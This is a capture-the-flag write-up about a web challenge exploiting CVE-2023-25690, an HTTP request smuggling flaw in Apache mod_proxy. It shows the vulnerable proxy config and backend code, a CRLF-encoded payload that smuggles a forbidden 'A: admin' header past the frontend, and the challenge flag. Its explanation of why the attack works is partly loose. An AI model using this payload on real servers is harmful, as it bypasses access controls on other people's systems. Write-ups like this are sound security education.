**Challenge Title:** Willy Wonka Web
**CVE:** CVE-2023-25690 (Apache mod\_proxy HTTP Request Smuggling)

A classic host-header/request-smuggling challenge: the frontend Apache proxy (with an exploitable mod\_proxy config) forwards to a backend Express server that only grants the flag if it sees an `a: admin` header. By smuggling a crafted request, we inject that header into the backend without it ever touching the frontend’s header filter.

---

## Source Code & Vulnerability

```js
// backend/server.js
app.get('/', async (req, res) => {
    if (req.header('a') && req.header('a') === 'admin') {
        return res.send(FLAG);
    }
    return res.send('Hello '+req.query.name.replace("<","").replace(">","")+'!');
});
```

```apache
# frontend/httpd.conf
RewriteEngine on
RewriteRule "^/name/(.*)" "http://backend:3000/?name=$1" [P]
RequestHeader unset A
RequestHeader unset a
```

* **Backend** only checks for header `a: admin`.
* **Frontend** unsets any incoming `A` or `a` headers, so a normal request can’t reach the backend with `a: admin`.
* The proxy configuration (Apache 2.4.0–2.4.55) is vulnerable to HTTP request smuggling (CVE-2023-25690), allowing us to split one HTTP packet into two at the proxy.

---

## Discovery

1. **Initial Recon:**

   * Noticed separate frontend (`httpd.conf`) and backend (`server.js`) ⟶ potential HRS scenario.
   * Tried classic CL.TE and TE.CL smuggling techniques against `/name/...` endpoint; no success.

2. **Version Lookup & CVE Research:**

   * Checked Apache version in error pages and Docker image tags ⟶ found 2.4.x with `mod_proxy_http`.
   * Searched “Apache mod\_proxy request smuggling” ⟶ landed on CVE-2023-25690, which describes a smuggling gap in header parsing between frontend and backend.

---

## Payload Crafting & Journey

After studying the [dhmosfunk POC](https://github.com/dhmosfunk/CVE-2023-25690-POC), I adapted it to this host and path:

```
GET /name/kidda HTTP/1.1
Host: wonka.chal.cyberjousting.com
A: admin

GET /name/test HTTP/1.1
Host: wonka.chal.cyberjousting.com
```

### Why It Works

* The **first** request line (`GET /name/kidda ...`) is forwarded to the backend with `?name=kidda`.
* The injected `A: admin` header is buffered at the proxy.
* The blank line plus second `GET` causes the proxy to treat the remainder as a **second** backend request:

  * **Backend sees** `GET /?name=test` with the buffered `A: admin` header intact.
  * It skips header stripping (done only on the original request) and delivers the flag.

---

## Exploitation payload used in burp & flag

```bash
GET /name/kidda%20HTTP/1.1%0d%0aHost:%20wonka.chal.cyberjousting.com%0d%0aA:%20admin%0d%0a%0d%0aGET%20/name/test HTTP/1.1
Host: wonka.chal.cyberjousting.com
```

**Flag:**

```
byuctf{i_never_liked_w1lly_wonka}
```
